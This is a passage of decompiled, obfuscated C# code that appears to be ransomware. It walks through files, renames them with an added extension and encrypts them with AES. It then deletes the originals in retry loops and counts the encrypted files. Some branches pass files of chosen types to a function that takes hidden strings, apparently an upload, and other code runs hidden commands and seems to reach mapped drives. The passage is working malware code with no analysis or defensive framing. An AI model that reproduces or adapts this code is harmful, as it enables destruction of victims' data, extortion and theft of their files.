!CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107401130)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107401149)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107401096)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107401115)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107400558)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107400573)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107400524)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(iBDvjzxzEcC(dOYydSKoLzIp.getString_0(107400539))) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107400514)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107396757)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107400469)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(CS_0024_003C_003E8__locals0.EonUYJCKfDwF) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(dOYydSKoLzIp.getString_0(107400476)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(dOYydSKoLzIp.getString_0(107400439)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(dOYydSKoLzIp.getString_0(107400434)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(dOYydSKoLzIp.getString_0(107400429)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107400424)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(COjZSLMnxffln) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(ndioqUCcjeEwRygxn) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(zSigBrcrKLvB))
			{
				if (CS_0024_003C_003E8__locals0.qEiHtzqbfmL.Length != 0)
				{
					string[] qEiHtzqbfmL = CS_0024_003C_003E8__locals0.qEiHtzqbfmL;
					int num = 0;
					while (num < qEiHtzqbfmL.Length)
					{
						string value = qEiHtzqbfmL[num];
						if (!CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1069;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(CS_0024_003C_003E8__locals0.EonUYJCKfDwF))
					{
						goto IL_1069;
					}
				}
				catch (Exception)
				{
					goto IL_1069;
				}
				if (!fQuiHGzOTAlx.Contains(CS_0024_003C_003E8__locals0.hGfHXtUEXE))
				{
					if (FiFLjMAxemfbt == dOYydSKoLzIp.getString_0(107396872))
					{
						try
						{
							if (BpsCidXmje.XYkowLVgnLlObar(CS_0024_003C_003E8__locals0.hGfHXtUEXE))
							{
								BpsCidXmje.ZKDZsMJwTeH(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
							}
						}
						catch
						{
						}
					}
					fQuiHGzOTAlx.Add(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
					if (!kEshrQncftX.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hGfHXtUEXE)))
					{
						kEshrQncftX.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hGfHXtUEXE));
					}
					bncyMjJFXOqmi(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
					try
					{
						new fqIueWgOQEK().uUMSRroBuQWna(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.hGfHXtUEXE, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (RxwgNpmsCUXw)
								{
									Console.WriteLine(dOYydSKoLzIp.getString_0(107349528) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + dOYydSKoLzIp.getString_0(107349451) + new FileInfo(CS_0024_003C_003E8__locals0.hGfHXtUEXE).Length + dOYydSKoLzIp.getString_0(107349430));
									Console.WriteLine(dOYydSKoLzIp.getString_0(107349421));
								}
							}
							catch
							{
							}
							pjARRmeFiHBjb(iBDvjzxzEcC(dOYydSKoLzIp.getString_0(107348836)), dOYydSKoLzIp.getString_0(107400340) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + dOYydSKoLzIp.getString_0(107400340) + iBDvjzxzEcC(dOYydSKoLzIp.getString_0(107348779)) + dOYydSKoLzIp.getString_0(107400340) + Environment.UserName + dOYydSKoLzIp.getString_0(107400340) + iBDvjzxzEcC(dOYydSKoLzIp.getString_0(107348794)));
						}
					}
					catch (Exception ex2)
					{
						if (SBPYnaSzKyFP)
						{
							try
							{
								File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107398621) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + dOYydSKoLzIp.getString_0(107348769) + ex2.Message + dOYydSKoLzIp.getString_0(107396703));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.hGfHXtUEXE).Length != 0L)
							{
								goto end_IL_085c;
							}
							goto end_IL_085c_2;
							end_IL_085c:;
						}
						catch (Exception ex4)
						{
							if (SBPYnaSzKyFP)
							{
								try
								{
									File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107398621) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + dOYydSKoLzIp.getString_0(107348656) + ex4.Message + dOYydSKoLzIp.getString_0(107396703));
								}
								catch (Exception)
								{
								}
							}
							PuPUesizAwkkz++;
							goto end_IL_085c_2;
						}
						if (eUAtnXtzwCVQtt == dOYydSKoLzIp.getString_0(107396872) && new FileInfo(CS_0024_003C_003E8__locals0.hGfHXtUEXE).Length > Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.EonUYJCKfDwF != dOYydSKoLzIp.getString_0(107397849))
								{
									if (lHJbFcHZdNnC)
									{
										CS_0024_003C_003E8__locals0.EonUYJCKfDwF = GrEoYlDdrrJcnWE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF;
									}
									File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF);
								}
							}
							catch (Exception ex6)
							{
								if (SBPYnaSzKyFP)
								{
									try
									{
										File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107398621) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + dOYydSKoLzIp.getString_0(107349107) + ex6.Message + dOYydSKoLzIp.getString_0(107396703));
									}
									catch (Exception)
									{
									}
								}
								PuPUesizAwkkz++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.EonUYJCKfDwF != dOYydSKoLzIp.getString_0(107397849))
							{
								CS_0024_003C_003E8__locals0.hGfHXtUEXE += CS_0024_003C_003E8__locals0.EonUYJCKfDwF;
							}
							if (cGbDMszYvGe == dOYydSKoLzIp.getString_0(107396872))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item3 in UaltDtqfmMVTAX)
									{
										if (CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.EqCJrbOGYCEo.EonUYJCKfDwF) && cGDFQVDbXvzo == dOYydSKoLzIp.lMWNgthKPX.getString_0(107396878))
										{
											if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.hGfHXtUEXE).Length)
											{
												try
												{
													orMQkbNvmzZPsHt.pBYlYRXdmUuSS(dOYydSKoLzIp.lMWNgthKPX.getString_0(107402207), dOYydSKoLzIp.lMWNgthKPX.getString_0(107402170), dOYydSKoLzIp.lMWNgthKPX.getString_0(107402189), CS_0024_003C_003E8__locals0.hGfHXtUEXE);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().EndsWith(item3) && cGDFQVDbXvzo == dOYydSKoLzIp.lMWNgthKPX.getString_0(107397135))
										{
											try
											{
												orMQkbNvmzZPsHt.pBYlYRXdmUuSS(dOYydSKoLzIp.lMWNgthKPX.getString_0(107402207), dOYydSKoLzIp.lMWNgthKPX.getString_0(107402170), dOYydSKoLzIp.lMWNgthKPX.getString_0(107402189), CS_0024_003C_003E8__locals0.hGfHXtUEXE);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = JNEDQxTiGyvPh.XoKGyJzEnHtiLD(32);
							string text2 = dOYydSKoLzIp.getString_0(107401576);
							text2 = (IflXfWBKZN ? JNEDQxTiGyvPh.QdOxughxMncJD() : dOYydSKoLzIp.getString_0(107401576));
							string s = PtmCzzxPcg.UDDTmPOlNfmsO(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (PurCmZibxBamv == dOYydSKoLzIp.getString_0(107397129))
							{
								byte[] array = null;
								byte[] byte_ = scvFMtYlVeb.hpGAnTLbaTEeN(CS_0024_003C_003E8__locals0.hGfHXtUEXE, Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024);
								if (!scvFMtYlVeb.mtRrTfokQWXkK(DNBUuDIlXHcMv: (!FmiPpRhQSBxQ) ? (IflXfWBKZN ? scvFMtYlVeb.AIyOtGwWrXEZ(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : scvFMtYlVeb.AIyOtGwWrXEZ(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.QsejQwxWKSqe), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IflXfWBKZN ? CiqamKuyrt.uZhbCYxeOxuMJx(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : CiqamKuyrt.uZhbCYxeOxuMJx(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.QsejQwxWKSqe), Convert.FromBase64String(eUUqvSerqkEdI))), MLqpVyadMeGdgmK: CS_0024_003C_003E8__locals0.hGfHXtUEXE, kRGGWEuoppgYu: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, CS_0024_003C_003E8__locals0.hGfHXtUEXE);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!IflXfWBKZN)
							{
								if (!QfVKvNIzyJTRTFb.nPDNQoqIpmrky(CS_0024_003C_003E8__locals0.hGfHXtUEXE, XLyVBayizjzN, CS_0024_003C_003E8__locals0.QsejQwxWKSqe, null, Convert.FromBase64String(eUUqvSerqkEdI)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, CS_0024_003C_003E8__locals0.hGfHXtUEXE);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!QfVKvNIzyJTRTFb.nPDNQoqIpmrky(CS_0024_003C_003E8__locals0.hGfHXtUEXE, XLyVBayizjzN, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, CS_0024_003C_003E8__locals0.hGfHXtUEXE);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (lHJbFcHZdNnC)
							{
								CS_0024_003C_003E8__locals0.EonUYJCKfDwF = GrEoYlDdrrJcnWE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF;
							}
							string text3 = JNEDQxTiGyvPh.XoKGyJzEnHtiLD(32);
							string text4 = dOYydSKoLzIp.getString_0(107401576);
							text4 = (IflXfWBKZN ? JNEDQxTiGyvPh.QdOxughxMncJD() : dOYydSKoLzIp.getString_0(107401576));
							string s2 = PtmCzzxPcg.UDDTmPOlNfmsO(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (CS_0024_003C_003E8__locals0.EonUYJCKfDwF != dOYydSKoLzIp.getString_0(107397849))
							{
								if (!yNTMpjtZXpajKX)
								{
									if (!IflXfWBKZN)
									{
										uHCaJlttjzbyG(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, dZNuvPCEnaSnNI);
									}
									else
									{
										uHCaJlttjzbyG(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!IflXfWBKZN)
										{
											eZxZiohcedVC(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, dZNuvPCEnaSnNI, Convert.FromBase64String(eUUqvSerqkEdI));
										}
										else
										{
											eZxZiohcedVC(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (SBPYnaSzKyFP)
										{
											try
											{
												File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107398621) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + dOYydSKoLzIp.getString_0(107397803) + ex11.Message + dOYydSKoLzIp.getString_0(107396703));
											}
											catch (Exception)
											{
											}
										}
										PuPUesizAwkkz++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, CS_0024_003C_003E8__locals0.hGfHXtUEXE);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!yNTMpjtZXpajKX)
							{
								if (!IflXfWBKZN)
								{
									uHCaJlttjzbyG(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + dOYydSKoLzIp.getString_0(107397812), dZNuvPCEnaSnNI);
								}
								else
								{
									uHCaJlttjzbyG(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + dOYydSKoLzIp.getString_0(107397812), Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!IflXfWBKZN)
									{
										eZxZiohcedVC(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE, dZNuvPCEnaSnNI, Convert.FromBase64String(eUUqvSerqkEdI));
									}
									else
									{
										eZxZiohcedVC(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (SBPYnaSzKyFP)
									{
										try
										{
											File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107398621) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + dOYydSKoLzIp.getString_0(107397803) + ex14.Message + dOYydSKoLzIp.getString_0(107396703));
										}
										catch (Exception)
										{
										}
									}
									PuPUesizAwkkz++;
									return;
								}
							}
							if (IflXfWBKZN)
							{
								if (CS_0024_003C_003E8__locals0.EonUYJCKfDwF != dOYydSKoLzIp.getString_0(107397849))
								{
									HiuKKSnyYq(CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, bytes2);
								}
								else
								{
									HiuKKSnyYq(CS_0024_003C_003E8__locals0.hGfHXtUEXE, bytes2);
								}
							}
						}
						end_IL_085c_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1069;
			IL_1069:
			CS_0024_003C_003E8__locals0.mBwKTyYUMnTK.Remove(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
		});
	}

	private static void swgUqDqyLKB(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (cGbDMszYvGe == getString_0(107396852))
					{
						foreach (string item in UaltDtqfmMVTAX)
						{
							if (string_0.ToLower().EndsWith(item) && cGDFQVDbXvzo == getString_0(107396852))
							{
								if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										orMQkbNvmzZPsHt.pBYlYRXdmUuSS(getString_0(107402181), getString_0(107402144), getString_0(107402163), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && cGDFQVDbXvzo == getString_0(107397109))
							{
								try
								{
									orMQkbNvmzZPsHt.pBYlYRXdmUuSS(getString_0(107402181), getString_0(107402144), getString_0(107402163), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107397792)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107397792), getString_0(107401556)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void eZxZiohcedVC(string bQeEtkfFQtPDB, string eIPoLBZBHQqIXs, byte[] wnqYgpvBvdWOd, byte[] WSRdTryFcPRLIA = null)
	{
		try
		{
			if (cGbDMszYvGe == getString_0(107396852))
			{
				FileStream fileStream = new FileStream(bQeEtkfFQtPDB, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in UaltDtqfmMVTAX)
				{
					if (bQeEtkfFQtPDB.ToLower().EndsWith(item) && cGDFQVDbXvzo == getString_0(107396852))
					{
						if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								orMQkbNvmzZPsHt.pBYlYRXdmUuSS(getString_0(107402181), getString_0(107402144), getString_0(107402163), bQeEtkfFQtPDB);
							}
							catch
							{
							}
						}
					}
					else if (bQeEtkfFQtPDB.ToLower().EndsWith(item) && cGDFQVDbXvzo == getString_0(107397109))
					{
						try
						{
							orMQkbNvmzZPsHt.pBYlYRXdmUuSS(getString_0(107402181), getString_0(107402144), getString_0(107402163), bQeEtkfFQtPDB);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (bQeEtkfFQtPDB != eIPoLBZBHQqIXs)
		{
			File.Move(bQeEtkfFQtPDB, eIPoLBZBHQqIXs);
			bQeEtkfFQtPDB = eIPoLBZBHQqIXs;
		}
		byte[] bytes = CiqamKuyrt.uZhbCYxeOxuMJx(File.ReadAllBytes(bQeEtkfFQtPDB), wnqYgpvBvdWOd, WSRdTryFcPRLIA);
		File.WriteAllBytes(bQeEtkfFQtPDB, bytes);
		SYFhGDZRgJn++;
	}

	private static void uHCaJlttjzbyG(string string_0, string string_1, byte[] byte_0)
	{
		yXTzQNUHviShmVK CS_0024_003C_003E8__locals0 = new yXTzQNUHviShmVK();
		CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq = string_0;
		CS_0024_003C_003E8__locals0.gKzpVcIViue = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string gKzpVcIViue = CS_0024_003C_003E8__locals0.gKzpVcIViue;
			FileStream fileStream = new FileStream(gKzpVcIViue, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (KZdUWCMWRza == getString_0(107396852))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.gKzpVcIViue.Length > 0)
				{
					if (cGbDMszYvGe == getString_0(107396852))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in UaltDtqfmMVTAX)
						{
							if (CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq.ToLower().EndsWith(item) && cGDFQVDbXvzo == getString_0(107396852))
							{
								if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										orMQkbNvmzZPsHt.pBYlYRXdmUuSS(getString_0(107402181), getString_0(107402144), getString_0(107402163), CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq.ToLower().EndsWith(item) && cGDFQVDbXvzo == getString_0(107397109))
							{
								try
								{
									orMQkbNvmzZPsHt.pBYlYRXdmUuSS(getString_0(107402181), getString_0(107402144), getString_0(107402163), CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.gKzpVcIViue.EndsWith(getString_0(107397792)))
					{
						File.Move(CS_0024_003C_003E8__locals0.gKzpVcIViue, CS_0024_003C_003E8__locals0.gKzpVcIViue.Replace(getString_0(107397792), getString_0(107401556)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.gKzpVcIViue))
							{
								File.Delete(CS_0024_003C_003E8__locals0.gKzpVcIViue);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (SBPYnaSzKyFP)
			{
				try
				{
					File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107398601) + CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq + getString_0(107397783) + ex2.Message + getString_0(107396683));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__6()
	{
		List<string> source = rPkvGTbuGbKlHk;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107398242)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		List<string> yxlLJRTpOOTgKkLzz = YxlLJRTpOOTgKkLzz;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107398229)), string_0);
			};
		}
		Parallel.ForEach(yxlLJRTpOOTgKkLzz, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		if (aprXJMnTJqstf == getString_0(107396852))
		{
			string[] goQslNJCCQhWEu = GoQslNJCCQhWEu;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107398229)), getString_0(107398204) + string_0 + getString_0(107398227));
				};
			}
			Parallel.ForEach(goQslNJCCQhWEu, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		if (!kkttwGmMPePa().Contains(getString_0(107397923)))
		{
			HNxxgdChoh(bgwisiXwlPmoFco);
		}
		else
		{
			List<string> source2 = sneXTQQmOIFmFM;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
				{
					pjARRmeFiHBjb(iBDvjzxzEcC(IpOHiOtFllLVXSK(getString_0(107398222))), string_0);
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		}
		List<string> source3 = fSptdVtByMByFE;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107398165)), string_0);
			};
		}
		Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107398242)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107398229)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107398229)), getString_0(107398204) + string_0 + getString_0(107398227));
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		pjARRmeFiHBjb(iBDvjzxzEcC(IpOHiOtFllLVXSK(getString_0(107398222))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107398165)), string_0);
	}

	private static void _003CMapDrv_003Eb__18(string string_0)
	{
		CvtvsehZvVox CS_0024_003C_003E8__locals0 = new CvtvsehZvVox();
		CS_0024_003C_003E8__locals0.OfutQEOgrcWV = string_0;
		if ((!CS_0024_003C_003E8__locals0.OfutQEOgrcWV.StartsWith(getString_0(107398180)) && !CS_0024_003C_003E8__locals0.OfutQEOgrcWV.StartsWith(getString_0(107398143)) && !CS_0024_003C_003E8__locals0.OfutQEOgrcWV.StartsWith(getString_0(107398134)) && !CS_0024_003C_003E8__locals0.OfutQEOgrcWV.StartsWith(getString_0(107401556))) || !DLNInMwPrHTI.YuPQEPIQgrKeMjD(CS_0024_003C_003E8__locals0.OfutQEOgrcWV))
